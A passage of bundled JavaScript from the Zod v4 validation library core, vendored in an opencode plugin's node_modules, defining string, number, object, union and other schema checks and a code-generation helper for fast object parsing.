  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.includes(def.includes, def.position))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "includes",
      includes: def.includes,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckStartsWith2 = /* @__PURE__ */ $constructor2("$ZodCheckStartsWith", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const pattern = new RegExp(`^${escapeRegex2(def.prefix)}.*`);
  def.pattern ?? (def.pattern = pattern);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.startsWith(def.prefix))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "starts_with",
      prefix: def.prefix,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckEndsWith2 = /* @__PURE__ */ $constructor2("$ZodCheckEndsWith", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const pattern = new RegExp(`.*${escapeRegex2(def.suffix)}$`);
  def.pattern ?? (def.pattern = pattern);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.endsWith(def.suffix))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "ends_with",
      suffix: def.suffix,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
function handleCheckPropertyResult2(result, payload, property) {
  if (result.issues.length) {
    payload.issues.push(...prefixIssues2(property, result.issues));
  }
}
var $ZodCheckProperty2 = /* @__PURE__ */ $constructor2("$ZodCheckProperty", (inst, def) => {
  $ZodCheck2.init(inst, def);
  inst._zod.check = (payload) => {
    const result = def.schema._zod.run({
      value: payload.value[def.property],
      issues: []
    }, {});
    if (result instanceof Promise) {
      return result.then((result2) => handleCheckPropertyResult2(result2, payload, def.property));
    }
    handleCheckPropertyResult2(result, payload, def.property);
    return;
  };
});
var $ZodCheckMimeType2 = /* @__PURE__ */ $constructor2("$ZodCheckMimeType", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const mimeSet = new Set(def.mime);
  inst._zod.onattach.push((inst2) => {
    inst2._zod.bag.mime = def.mime;
  });
  inst._zod.check = (payload) => {
    if (mimeSet.has(payload.value.type))
      return;
    payload.issues.push({
      code: "invalid_value",
      values: def.mime,
      input: payload.value.type,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckOverwrite2 = /* @__PURE__ */ $constructor2("$ZodCheckOverwrite", (inst, def) => {
  $ZodCheck2.init(inst, def);
  inst._zod.check = (payload) => {
    payload.value = def.tx(payload.value);
  };
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/doc.js
class Doc2 {
  constructor(args = []) {
    this.content = [];
    this.indent = 0;
    if (this)
      this.args = args;
  }
  indented(fn) {
    this.indent += 1;
    fn(this);
    this.indent -= 1;
  }
  write(arg) {
    if (typeof arg === "function") {
      arg(this, { execution: "sync" });
      arg(this, { execution: "async" });
      return;
    }
    const content = arg;
    const lines = content.split(`
`).filter((x) => x);
    const minIndent = Math.min(...lines.map((x) => x.length - x.trimStart().length));
    const dedented = lines.map((x) => x.slice(minIndent)).map((x) => " ".repeat(this.indent * 2) + x);
    for (const line of dedented) {
      this.content.push(line);
    }
  }
  compile() {
    const F = Function;
    const args = this?.args;
    const content = this?.content ?? [``];
    const lines = [...content.map((x) => `  ${x}`)];
    return new F(...args, lines.join(`
`));
  }
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/versions.js
var version2 = {
  major: 4,
  minor: 1,
  patch: 8
};

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/schemas.js
var $ZodType2 = /* @__PURE__ */ $constructor2("$ZodType", (inst, def) => {
  var _a2;
  inst ?? (inst = {});
  inst._zod.def = def;
  inst._zod.bag = inst._zod.bag || {};
  inst._zod.version = version2;
  const checks3 = [...inst._zod.def.checks ?? []];
  if (inst._zod.traits.has("$ZodCheck")) {
    checks3.unshift(inst);
  }
  for (const ch of checks3) {
    for (const fn of ch._zod.onattach) {
      fn(inst);
    }
  }
  if (checks3.length === 0) {
    (_a2 = inst._zod).deferred ?? (_a2.deferred = []);
    inst._zod.deferred?.push(() => {
      inst._zod.run = inst._zod.parse;
    });
  } else {
    const runChecks = (payload, checks4, ctx) => {
      let isAborted = aborted2(payload);
      let asyncResult;
      for (const ch of checks4) {
        if (ch._zod.def.when) {
          const shouldRun = ch._zod.def.when(payload);
          if (!shouldRun)
            continue;
        } else if (isAborted) {
          continue;
        }
        const currLen = payload.issues.length;
        const _ = ch._zod.check(payload);
        if (_ instanceof Promise && ctx?.async === false) {
          throw new $ZodAsyncError2;
        }
        if (asyncResult || _ instanceof Promise) {
          asyncResult = (asyncResult ?? Promise.resolve()).then(async () => {
            await _;
            const nextLen = payload.issues.length;
            if (nextLen === currLen)
              return;
            if (!isAborted)
              isAborted = aborted2(payload, currLen);
          });
        } else {
          const nextLen = payload.issues.length;
          if (nextLen === currLen)
            continue;
          if (!isAborted)
            isAborted = aborted2(payload, currLen);
        }
      }
      if (asyncResult) {
        return asyncResult.then(() => {
          return payload;
        });
      }
      return payload;
    };
    const handleCanaryResult = (canary, payload, ctx) => {
      if (aborted2(canary)) {
        canary.aborted = true;
        return canary;
      }
      const checkResult = runChecks(payload, checks3, ctx);
      if (checkResult instanceof Promise) {
        if (ctx.async === false)
          throw new $ZodAsyncError2;
        return checkResult.then((checkResult2) => inst._zod.parse(checkResult2, ctx));
      }
      return inst._zod.parse(checkResult, ctx);
    };
    inst._zod.run = (payload, ctx) => {
      if (ctx.skipChecks) {
        return inst._zod.parse(payload, ctx);
      }
      if (ctx.direction === "backward") {
        const canary = inst._zod.parse({ value: payload.value, issues: [] }, { ...ctx, skipChecks: true });
        if (canary instanceof Promise) {
          return canary.then((canary2) => {
            return handleCanaryResult(canary2, payload, ctx);
          });
        }
        return handleCanaryResult(canary, payload, ctx);
      }
      const result = inst._zod.parse(payload, ctx);
      if (result instanceof Promise) {
        if (ctx.async === false)
          throw new $ZodAsyncError2;
        return result.then((result2) => runChecks(result2, checks3, ctx));
      }
      return runChecks(result, checks3, ctx);
    };
  }
  inst["~standard"] = {
    validate: (value) => {
      try {
        const r = safeParse3(inst, value);
        return r.success ? { value: r.data } : { issues: r.error?.issues };
      } catch (_) {
        return safeParseAsync3(inst, value).then((r) => r.success ? { value: r.data } : { issues: r.error?.issues });
      }
    },
    vendor: "zod",
    version: 1
  };
});
var $ZodString2 = /* @__PURE__ */ $constructor2("$ZodString", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = [...inst?._zod.bag?.patterns ?? []].pop() ?? string4(inst._zod.bag);
  inst._zod.parse = (payload, _) => {
    if (def.coerce)
      try {
        payload.value = String(payload.value);
      } catch (_2) {}
    if (typeof payload.value === "string")
      return payload;
    payload.issues.push({
      expected: "string",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodStringFormat2 = /* @__PURE__ */ $constructor2("$ZodStringFormat", (inst, def) => {
  $ZodCheckStringFormat2.init(inst, def);
  $ZodString2.init(inst, def);
});
var $ZodGUID2 = /* @__PURE__ */ $constructor2("$ZodGUID", (inst, def) => {
  def.pattern ?? (def.pattern = guid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodUUID2 = /* @__PURE__ */ $constructor2("$ZodUUID", (inst, def) => {
  if (def.version) {
    const versionMap = {
      v1: 1,
      v2: 2,
      v3: 3,
      v4: 4,
      v5: 5,
      v6: 6,
      v7: 7,
      v8: 8
    };
    const v = versionMap[def.version];
    if (v === undefined)
      throw new Error(`Invalid UUID version: "${def.version}"`);
    def.pattern ?? (def.pattern = uuid3(v));
  } else
    def.pattern ?? (def.pattern = uuid3());
  $ZodStringFormat2.init(inst, def);
});
var $ZodEmail2 = /* @__PURE__ */ $constructor2("$ZodEmail", (inst, def) => {
  def.pattern ?? (def.pattern = email3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodURL2 = /* @__PURE__ */ $constructor2("$ZodURL", (inst, def) => {
  $ZodStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    try {
      const trimmed = payload.value.trim();
      const url2 = new URL(trimmed);
      if (def.hostname) {
        def.hostname.lastIndex = 0;
        if (!def.hostname.test(url2.hostname)) {
          payload.issues.push({
            code: "invalid_format",
            format: "url",
            note: "Invalid hostname",
            pattern: hostname3.source,
            input: payload.value,
            inst,
            continue: !def.abort
          });
        }
      }
      if (def.protocol) {
        def.protocol.lastIndex = 0;
        if (!def.protocol.test(url2.protocol.endsWith(":") ? url2.protocol.slice(0, -1) : url2.protocol)) {
          payload.issues.push({
            code: "invalid_format",
            format: "url",
            note: "Invalid protocol",
            pattern: def.protocol.source,
            input: payload.value,
            inst,
            continue: !def.abort
          });
        }
      }
      if (def.normalize) {
        payload.value = url2.href;
      } else {
        payload.value = trimmed;
      }
      return;
    } catch (_) {
      payload.issues.push({
        code: "invalid_format",
        format: "url",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodEmoji2 = /* @__PURE__ */ $constructor2("$ZodEmoji", (inst, def) => {
  def.pattern ?? (def.pattern = emoji3());
  $ZodStringFormat2.init(inst, def);
});
var $ZodNanoID2 = /* @__PURE__ */ $constructor2("$ZodNanoID", (inst, def) => {
  def.pattern ?? (def.pattern = nanoid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodCUID3 = /* @__PURE__ */ $constructor2("$ZodCUID", (inst, def) => {
  def.pattern ?? (def.pattern = cuid5);
  $ZodStringFormat2.init(inst, def);
});
var $ZodCUID22 = /* @__PURE__ */ $constructor2("$ZodCUID2", (inst, def) => {
  def.pattern ?? (def.pattern = cuid23);
  $ZodStringFormat2.init(inst, def);
});
var $ZodULID2 = /* @__PURE__ */ $constructor2("$ZodULID", (inst, def) => {
  def.pattern ?? (def.pattern = ulid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodXID2 = /* @__PURE__ */ $constructor2("$ZodXID", (inst, def) => {
  def.pattern ?? (def.pattern = xid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodKSUID2 = /* @__PURE__ */ $constructor2("$ZodKSUID", (inst, def) => {
  def.pattern ?? (def.pattern = ksuid3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodISODateTime2 = /* @__PURE__ */ $constructor2("$ZodISODateTime", (inst, def) => {
  def.pattern ?? (def.pattern = datetime3(def));
  $ZodStringFormat2.init(inst, def);
});
var $ZodISODate2 = /* @__PURE__ */ $constructor2("$ZodISODate", (inst, def) => {
  def.pattern ?? (def.pattern = date5);
  $ZodStringFormat2.init(inst, def);
});
var $ZodISOTime2 = /* @__PURE__ */ $constructor2("$ZodISOTime", (inst, def) => {
  def.pattern ?? (def.pattern = time3(def));
  $ZodStringFormat2.init(inst, def);
});
var $ZodISODuration2 = /* @__PURE__ */ $constructor2("$ZodISODuration", (inst, def) => {
  def.pattern ?? (def.pattern = duration3);
  $ZodStringFormat2.init(inst, def);
});
var $ZodIPv42 = /* @__PURE__ */ $constructor2("$ZodIPv4", (inst, def) => {
  def.pattern ?? (def.pattern = ipv43);
  $ZodStringFormat2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = `ipv4`;
  });
});
var $ZodIPv62 = /* @__PURE__ */ $constructor2("$ZodIPv6", (inst, def) => {
  def.pattern ?? (def.pattern = ipv63);
  $ZodStringFormat2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = `ipv6`;
  });
  inst._zod.check = (payload) => {
    try {
      new URL(`http://[${payload.value}]`);
    } catch {
      payload.issues.push({
        code: "invalid_format",
        format: "ipv6",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodCIDRv42 = /* @__PURE__ */ $constructor2("$ZodCIDRv4", (inst, def) => {
  def.pattern ?? (def.pattern = cidrv43);
  $ZodStringFormat2.init(inst, def);
});
var $ZodCIDRv62 = /* @__PURE__ */ $constructor2("$ZodCIDRv6", (inst, def) => {
  def.pattern ?? (def.pattern = cidrv63);
  $ZodStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    const parts = payload.value.split("/");
    try {
      if (parts.length !== 2)
        throw new Error;
      const [address, prefix] = parts;
      if (!prefix)
        throw new Error;
      const prefixNum = Number(prefix);
      if (`${prefixNum}` !== prefix)
        throw new Error;
      if (prefixNum < 0 || prefixNum > 128)
        throw new Error;
      new URL(`http://[${address}]`);
    } catch {
      payload.issues.push({
        code: "invalid_format",
        format: "cidrv6",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
function isValidBase642(data) {
  if (data === "")
    return true;
  if (data.length % 4 !== 0)
    return false;
  try {
    atob(data);
    return true;
  } catch {
    return false;
  }
}
var $ZodBase642 = /* @__PURE__ */ $constructor2("$ZodBase64", (inst, def) => {
  def.pattern ?? (def.pattern = base643);
  $ZodStringFormat2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    inst2._zod.bag.contentEncoding = "base64";
  });
  inst._zod.check = (payload) => {
    if (isValidBase642(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "base64",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
function isValidBase64URL2(data) {
  if (!base64url3.test(data))
    return false;
  const base644 = data.replace(/[-_]/g, (c) => c === "-" ? "+" : "/");
  const padded = base644.padEnd(Math.ceil(base644.length / 4) * 4, "=");
  return isValidBase642(padded);
}
var $ZodBase64URL2 = /* @__PURE__ */ $constructor2("$ZodBase64URL", (inst, def) => {
  def.pattern ?? (def.pattern = base64url3);
  $ZodStringFormat2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    inst2._zod.bag.contentEncoding = "base64url";
  });
  inst._zod.check = (payload) => {
    if (isValidBase64URL2(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "base64url",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodE1642 = /* @__PURE__ */ $constructor2("$ZodE164", (inst, def) => {
  def.pattern ?? (def.pattern = e1643);
  $ZodStringFormat2.init(inst, def);
});
function isValidJWT2(token, algorithm = null) {
  try {
    const tokensParts = token.split(".");
    if (tokensParts.length !== 3)
      return false;
    const [header] = tokensParts;
    if (!header)
      return false;
    const parsedHeader = JSON.parse(atob(header));
    if ("typ" in parsedHeader && parsedHeader?.typ !== "JWT")
      return false;
    if (!parsedHeader.alg)
      return false;
    if (algorithm && (!("alg" in parsedHeader) || parsedHeader.alg !== algorithm))
      return false;
    return true;
  } catch {
    return false;
  }
}
var $ZodJWT2 = /* @__PURE__ */ $constructor2("$ZodJWT", (inst, def) => {
  $ZodStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    if (isValidJWT2(payload.value, def.alg))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: "jwt",
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCustomStringFormat2 = /* @__PURE__ */ $constructor2("$ZodCustomStringFormat", (inst, def) => {
  $ZodStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    if (def.fn(payload.value))
      return;
    payload.issues.push({
      code: "invalid_format",
      format: def.format,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodNumber2 = /* @__PURE__ */ $constructor2("$ZodNumber", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = inst._zod.bag.pattern ?? number4;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = Number(payload.value);
      } catch (_) {}
    const input = payload.value;
    if (typeof input === "number" && !Number.isNaN(input) && Number.isFinite(input)) {
      return payload;
    }
    const received = typeof input === "number" ? Number.isNaN(input) ? "NaN" : !Number.isFinite(input) ? "Infinity" : undefined : undefined;
    payload.issues.push({
      expected: "number",
      code: "invalid_type",
      input,
      inst,
      ...received ? { received } : {}
    });
    return payload;
  };
});
var $ZodNumberFormat2 = /* @__PURE__ */ $constructor2("$ZodNumber", (inst, def) => {
  $ZodCheckNumberFormat2.init(inst, def);
  $ZodNumber2.init(inst, def);
});
var $ZodBoolean2 = /* @__PURE__ */ $constructor2("$ZodBoolean", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = boolean4;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = Boolean(payload.value);
      } catch (_) {}
    const input = payload.value;
    if (typeof input === "boolean")
      return payload;
    payload.issues.push({
      expected: "boolean",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodBigInt2 = /* @__PURE__ */ $constructor2("$ZodBigInt", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = bigint4;
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce)
      try {
        payload.value = BigInt(payload.value);
      } catch (_) {}
    if (typeof payload.value === "bigint")
      return payload;
    payload.issues.push({
      expected: "bigint",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodBigIntFormat2 = /* @__PURE__ */ $constructor2("$ZodBigInt", (inst, def) => {
  $ZodCheckBigIntFormat2.init(inst, def);
  $ZodBigInt2.init(inst, def);
});
var $ZodSymbol2 = /* @__PURE__ */ $constructor2("$ZodSymbol", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "symbol")
      return payload;
    payload.issues.push({
      expected: "symbol",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodUndefined2 = /* @__PURE__ */ $constructor2("$ZodUndefined", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = _undefined4;
  inst._zod.values = new Set([undefined]);
  inst._zod.optin = "optional";
  inst._zod.optout = "optional";
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "undefined")
      return payload;
    payload.issues.push({
      expected: "undefined",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodNull2 = /* @__PURE__ */ $constructor2("$ZodNull", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.pattern = _null4;
  inst._zod.values = new Set([null]);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (input === null)
      return payload;
    payload.issues.push({
      expected: "null",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodAny2 = /* @__PURE__ */ $constructor2("$ZodAny", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload) => payload;
});
var $ZodUnknown2 = /* @__PURE__ */ $constructor2("$ZodUnknown", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload) => payload;
});
var $ZodNever2 = /* @__PURE__ */ $constructor2("$ZodNever", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    payload.issues.push({
      expected: "never",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodVoid2 = /* @__PURE__ */ $constructor2("$ZodVoid", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (typeof input === "undefined")
      return payload;
    payload.issues.push({
      expected: "void",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodDate2 = /* @__PURE__ */ $constructor2("$ZodDate", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (def.coerce) {
      try {
        payload.value = new Date(payload.value);
      } catch (_err) {}
    }
    const input = payload.value;
    const isDate = input instanceof Date;
    const isValidDate = isDate && !Number.isNaN(input.getTime());
    if (isValidDate)
      return payload;
    payload.issues.push({
      expected: "date",
      code: "invalid_type",
      input,
      ...isDate ? { received: "Invalid Date" } : {},
      inst
    });
    return payload;
  };
});
function handleArrayResult2(result, final, index) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues2(index, result.issues));
  }
  final.value[index] = result.value;
}
var $ZodArray2 = /* @__PURE__ */ $constructor2("$ZodArray", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!Array.isArray(input)) {
      payload.issues.push({
        expected: "array",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    payload.value = Array(input.length);
    const proms = [];
    for (let i = 0;i < input.length; i++) {
      const item = input[i];
      const result = def.element._zod.run({
        value: item,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleArrayResult2(result2, payload, i)));
      } else {
        handleArrayResult2(result, payload, i);
      }
    }
    if (proms.length) {
      return Promise.all(proms).then(() => payload);
    }
    return payload;
  };
});
function handlePropertyResult2(result, final, key, input) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues2(key, result.issues));
  }
  if (result.value === undefined) {
    if (key in input) {
      final.value[key] = undefined;
    }
  } else {
    final.value[key] = result.value;
  }
}
function normalizeDef2(def) {
  const keys = Object.keys(def.shape);
  for (const k of keys) {
    if (!def.shape?.[k]?._zod?.traits?.has("$ZodType")) {
      throw new Error(`Invalid element at key "${k}": expected a Zod schema`);
    }
  }
  const okeys = optionalKeys2(def.shape);
  return {
    ...def,
    keys,
    keySet: new Set(keys),
    numKeys: keys.length,
    optionalKeys: new Set(okeys)
  };
}
function handleCatchall2(proms, input, payload, ctx, def, inst) {
  const unrecognized = [];
  const keySet = def.keySet;
  const _catchall = def.catchall._zod;
  const t = _catchall.def.type;
  for (const key of Object.keys(input)) {
    if (keySet.has(key))
      continue;
    if (t === "never") {
      unrecognized.push(key);
      continue;
    }
    const r = _catchall.run({ value: input[key], issues: [] }, ctx);
    if (r instanceof Promise) {
      proms.push(r.then((r2) => handlePropertyResult2(r2, payload, key, input)));
    } else {
      handlePropertyResult2(r, payload, key, input);
    }
  }
  if (unrecognized.length) {
    payload.issues.push({
      code: "unrecognized_keys",
      keys: unrecognized,
      input,
      inst
    });
  }
  if (!proms.length)
    return payload;
  return Promise.all(proms).then(() => {
    return payload;
  });
}
var $ZodObject2 = /* @__PURE__ */ $constructor2("$ZodObject", (inst, def) => {
  $ZodType2.init(inst, def);
  const _normalized = cached2(() => normalizeDef2(def));
  defineLazy2(inst._zod, "propValues", () => {
    const shape = def.shape;
    const propValues = {};
    for (const key in shape) {
      const field = shape[key]._zod;
      if (field.values) {
        propValues[key] ?? (propValues[key] = new Set);
        for (const v of field.values)
          propValues[key].add(v);
      }
    }
    return propValues;
  });
  const isObject3 = isObject2;
  const catchall = def.catchall;
  let value;
  inst._zod.parse = (payload, ctx) => {
    value ?? (value = _normalized.value);
    const input = payload.value;
    if (!isObject3(input)) {
      payload.issues.push({
        expected: "object",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    payload.value = {};
    const proms = [];
    const shape = value.shape;
    for (const key of value.keys) {
      const el = shape[key];
      const r = el._zod.run({ value: input[key], issues: [] }, ctx);
      if (r instanceof Promise) {
        proms.push(r.then((r2) => handlePropertyResult2(r2, payload, key, input)));
      } else {
        handlePropertyResult2(r, payload, key, input);
      }
    }
    if (!catchall) {
      return proms.length ? Promise.all(proms).then(() => payload) : payload;
    }
    return handleCatchall2(proms, input, payload, ctx, _normalized.value, inst);
  };
});
var $ZodObjectJIT2 = /* @__PURE__ */ $constructor2("$ZodObjectJIT", (inst, def) => {
  $ZodObject2.init(inst, def);
  const superParse = inst._zod.parse;
  const _normalized = cached2(() => normalizeDef2(def));
  const generateFastpass = (shape) => {
    const doc2 = new Doc2(["shape", "payload", "ctx"]);
    const normalized = _normalized.value;
    const parseStr = (key) => {
      const k = esc2(key);
      return `shape[${k}]._zod.run({ value: input[${k}], issues: [] }, ctx)`;
    };
    doc2.write(`const input = payload.value;`);
    const ids = Object.create(null);
    let counter = 0;
    for (const key of normalized.keys) {
      ids[key] = `key_${counter++}`;
    }
    doc2.write(`const newResult = {};`);
    for (const key of normalized.keys) {
      const id = ids[key];
      const k = esc2(key);
      doc2.write(`const ${id} = ${parseStr(key)};`);
      doc2.write(`
        if (${id}.issues.length) {
          payload.issues = payload.issues.concat(${id}.issues.map(iss => ({
            ...iss,
            path: iss.path ? [${k}, ...iss.path] : [${k}]
          })));
        }
        
        
        if (${id}.value === undefined) {
          if (${k} in input) {
            newResult[${k}] = undefined;
          }
        } else {
          newResult[${k}] = ${id}.value;
        }
        
      `);
    }
    doc2.write(`payload.value = newResult;`);
    doc2.write(`return payload;`);
    const fn = doc2.compile();
    return (payload, ctx) => fn(shape, payload, ctx);
  };
  let fastpass;
  const isObject3 = isObject2;
  const jit = !globalConfig2.jitless;
  const allowsEval3 = allowsEval2;
  const fastEnabled = jit && allowsEval3.value;
  const catchall = def.catchall;
  let value;
  inst._zod.parse = (payload, ctx) => {
    value ?? (value = _normalized.value);
    const input = payload.value;
    if (!isObject3(input)) {
      payload.issues.push({
        expected: "object",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    if (jit && fastEnabled && ctx?.async === false && ctx.jitless !== true) {
      if (!fastpass)
        fastpass = generateFastpass(def.shape);
      payload = fastpass(payload, ctx);
      if (!catchall)
        return payload;
      return handleCatchall2([], input, payload, ctx, value, inst);
    }
    return superParse(payload, ctx);
  };
});
function handleUnionResults2(results, final, inst, ctx) {
  for (const result of results) {
    if (result.issues.length === 0) {
      final.value = result.value;
      return final;
    }
  }
  const nonaborted = results.filter((r) => !aborted2(r));
  if (nonaborted.length === 1) {
    final.value = nonaborted[0].value;
    return nonaborted[0];
  }
  final.issues.push({
    code: "invalid_union",
    input: final.value,
    inst,
    errors: results.map((result) => result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())))
  });
  return final;
}
var $ZodUnion2 = /* @__PURE__ */ $constructor2("$ZodUnion", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "optin", () => def.options.some((o) => o._zod.optin === "optional") ? "optional" : undefined);
  defineLazy2(inst._zod, "optout", () => def.options.some((o) => o._zod.optout === "optional") ? "optional" : undefined);
  defineLazy2(inst._zod, "values", () => {
    if (def.options.every((o) => o._zod.values)) {
      return new Set(def.options.flatMap((option) => Array.from(option._zod.values)));
    }
    return;
  });
  defineLazy2(inst._zod, "pattern", () => {
    if (def.options.every((o) => o._zod.pattern)) {
      const patterns = def.options.map((o) => o._zod.pattern);
      return new RegExp(`^(${patterns.map((p) => cleanRegex2(p.source)).join("|")})$`);
    }
    return;
  });
  const single = def.options.length === 1;
  const first = def.options[0]._zod.run;
  inst._zod.parse = (payload, ctx) => {
    if (single) {
      return first(payload, ctx);
    }
    let async = false;
    const results = [];
    for (const option of def.options) {
      const result = option._zod.run({
        value: payload.value,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        results.push(result);
        async = true;
      } else {
        if (result.issues.length === 0)
          return result;
        results.push(result);
      }
    }
    if (!async)
      return handleUnionResults2(results, payload, inst, ctx);
    return Promise.all(results).then((results2) => {
      return handleUnionResults2(results2, payload, inst, ctx);
    });
  };
});
var $ZodDiscriminatedUnion2 = /* @__PURE__ */ $constructor2("$ZodDiscriminatedUnion", (inst, def) => {
  $ZodUnion2.init(inst, def);
  const _super = inst._zod.parse;
  defineLazy2(inst._zod, "propValues", () => {
    const propValues = {};
    for (const option of def.options) {
      const pv = option._zod.propValues;
      if (!pv || Object.keys(pv).length === 0)
        throw new Error(`Invalid discriminated union option at index "${def.options.indexOf(option)}"`);
      for (const [k, v] of Object.entries(pv)) {
        if (!propValues[k])
          propValues[k] = new Set;
        for (const val of v) {
          propValues[k].add(val);
        }
      }
    }
    return propValues;
  });
  const disc = cached2(() => {
    const opts = def.options;
    const map2 = new Map;
    for (const o of opts) {
      const values = o._zod.propValues?.[def.discriminator];
      if (!values || values.size === 0)
        throw new Error(`Invalid discriminated union option at index "${def.options.indexOf(o)}"`);
      for (const v of values) {
        if (map2.has(v)) {
          throw new Error(`Duplicate discriminator value "${String(v)}"`);
        }
        map2.set(v, o);
      }
    }
    return map2;
  });
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!isObject2(input)) {
      payload.issues.push({
        code: "invalid_type",
        expected: "object",
        input,
        inst
      });
      return payload;
    }
    const opt = disc.value.get(input?.[def.discriminator]);
    if (opt) {
      return opt._zod.run(payload, ctx);
    }
    if (def.unionFallback) {
      return _super(payload, ctx);
    }
    payload.issues.push({
      code: "invalid_union",
      errors: [],
      note: "No matching discriminator",
      discriminator: def.discriminator,
      input,
      path: [def.discriminator],
      inst
    });
    return payload;
  };
});
var $ZodIntersection2 = /* @__PURE__ */ $constructor2("$ZodIntersection", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    const left = def.left._zod.run({ value: input, issues: [] }, ctx);
    const right = def.right._zod.run({ value: input, issues: [] }, ctx);
    const async = left instanceof Promise || right instanceof Promise;
    if (async) {
      return Promise.all([left, right]).then(([left2, right2]) => {
        return handleIntersectionResults2(payload, left2, right2);
      });
    }
    return handleIntersectionResults2(payload, left, right);
  };
});
function mergeValues2(a, b) {
  if (a === b) {
    return { valid: true, data: a };
  }
  if (a instanceof Date && b instanceof Date && +a === +b) {
    return { valid: true, data: a };
  }
  if (isPlainObject2(a) && isPlainObject2(b)) {
    const bKeys = Object.keys(b);
    const sharedKeys = Object.keys(a).filter((key) => bKeys.indexOf(key) !== -1);
    const newObj = { ...a, ...b };
    for (const key of sharedKeys) {
